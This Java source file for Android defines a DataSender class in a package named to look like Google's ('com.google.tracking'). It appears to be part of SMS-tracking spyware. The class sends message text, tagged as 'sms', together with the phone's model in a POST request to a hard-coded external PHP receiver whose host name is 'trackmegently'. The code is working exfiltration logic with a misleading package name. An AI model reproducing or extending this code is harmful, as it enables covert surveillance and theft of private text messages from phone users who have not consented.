package com.google.tracking;

import android.content.Context;
import android.os.Build;
import android.util.Log;
import android.widget.Toast;

import java.io.*;
import java.net.*;
import java.nio.charset.Charset;

/**
 * Created by maxim.yanukovich on 06.01.2015.
 */
public class DataSender {
    //private static String urlString = "http://192.168.9.71:80/SVN/receiver.php";
    private static String urlString = "http://trackmegently.byethost3.com/receiver.php";
    private static String SMS = "sms";

    public DataSender(String msg, Context context) {
        Log.d(this.getClass().toString(), urlString.toString());

        disableConnectionReuseIfNecessary();

        sendSMS(msg);
    }

    public void sendSMS(String msg) {
        postHttp(SMS, msg);
    }

    private void postHttp(String action, String msg) {
        try {

            String urlParameters = "action=" + action + "&msg=" + msg + "&model=" + Build.MODEL;
            byte[] postData = urlParameters.getBytes(Charset.forName("UTF-8"));
            int postDataLength = postData.length;

            URL url = new URL(urlString);
            HttpURLConnection httConn = (HttpURLConnection) url.openConnection();
            httConn.setDoOutput(true);
            httConn.setDoInput(true);
            httConn.setInstanceFollowRedirects(false);
            httConn.setRequestMethod("POST");
            httConn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            httConn.setRequestProperty("charset", "utf-8");
            httConn.setRequestProperty("Content-Length", Integer.toString(postDataLength));
            httConn.setUseCaches(false);
            httConn.connect();
            try {
                DataOutputStream os = new DataOutputStream(httConn.getOutputStream());
                os.write(postData);
                Log.d("getResponseCode", String.valueOf(httConn.getResponseCode()));
//                wr.writeUTF(urlParameters);
            } catch (Exception ex) {
                Log.d("Exception", ex.getMessage());
            }


            // Handles possible exceptions
        } catch (MalformedURLException localMalformedURLException) {
            localMalformedURLException.printStackTrace();

        } catch (IOException localIOException) {
            localIOException.printStackTrace();
        }
    }

    private void disableConnectionReuseIfNecessary() {
        // HTTP connection reuse which was buggy pre-froyo
        if (Integer.parseInt(Build.VERSION.SDK) < Build.VERSION_CODES.FROYO) {
            System.setProperty("http.keepAlive", "false");
        }
    }
}
